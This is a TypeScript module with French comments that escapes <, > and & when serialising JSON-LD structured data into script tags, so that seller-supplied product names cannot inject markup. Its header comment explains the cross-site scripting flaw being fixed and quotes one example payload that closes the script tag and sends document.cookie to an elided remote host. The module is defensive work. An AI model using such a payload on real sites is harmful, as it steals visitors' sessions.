/**
 * Sérialiser des données structurées destinées à une balise `<script>`.
 *
 * ────────────────────────────────────────────────────────────────────────
 * La faille que ce module ferme
 * ────────────────────────────────────────────────────────────────────────
 *
 * Les fiches produit et boutique publient leurs données Schema.org ainsi :
 *
 *     <script type="application/ld+json"
 *             dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
 *
 * C'est le geste que tout le monde fait, et il est faux. `JSON.stringify`
 * échappe ce qui casserait le **JSON** — guillemets, antislashs, retours à la
 * ligne — et rien de ce qui casserait le **HTML**. Le chevron ouvrant passe
 * intact. Un produit nommé
 *
 *     </script><script>fetch('https://…/'+document.cookie)</script>
 *
 * referme donc la balise de données et ouvre la sienne. Le nom et la
 * description viennent du vendeur, sans filtrage : n'importe quelle boutique
 * approuvée pouvait exécuter du code chez tous les visiteurs de sa fiche.
 *
 * La politique de sécurité du contenu n'y changeait rien : `script-src` porte
 * `'unsafe-inline'`, indispensable aux scripts d'hydratation de Next, et un
 * script injecté dans le document s'exécute donc au même titre qu'eux — avec
 * l'origine du site, donc l'accès aux actions serveur au nom de la personne
 * connectée.
 *
 * ────────────────────────────────────────────────────────────────────────
 * Ce qu'on échappe, et pourquoi ces caractères-là
 * ────────────────────────────────────────────────────────────────────────
 *
 * Trois séquences, remplacées par leur échappement Unicode. Les trois restent
 * du JSON parfaitement valide — un analyseur relit `<` comme `<` — mais
 * aucune ne ressemble plus à du balisage pour l'analyseur HTML, qui, lui, ne
 * comprend pas les échappements JSON et lit les octets tels quels.
 *
 *   · `<` — ferme la balise, c'est le vecteur principal ;
 *   · `>` — par symétrie, et parce que certains analyseurs tolérants
 *     reconstruisent une balise à partir d'un seul chevron fermant ;
 *   · `&` — empêche qu'une entité HTML (`&lt;script&gt;`) soit décodée en
 *     chevrons par le navigateur après coup, ce qui recréerait le vecteur
 *     depuis un contenu qui paraissait inoffensif.
 *
 * On ne filtre pas le contenu, on le neutralise : un vendeur a le droit
 * d'appeler son article « Robe < 50 DT », et ce nom doit ressortir intact dans
 * les résultats de recherche Google.
 */

/**
 * Le JSON prêt à être posé dans `dangerouslySetInnerHTML`.
 *
 * À utiliser partout où un objet est sérialisé vers une balise `<script>` —
 * données structurées, état initial, configuration. Jamais `JSON.stringify`
 * directement à cet endroit.
 */
export function jsonLd(donnees: unknown): string {
  return JSON.stringify(donnees)
    .replaceAll("<", "\\u003c")
    .replaceAll(">", "\\u003e")
    .replaceAll("&", "\\u0026");
}
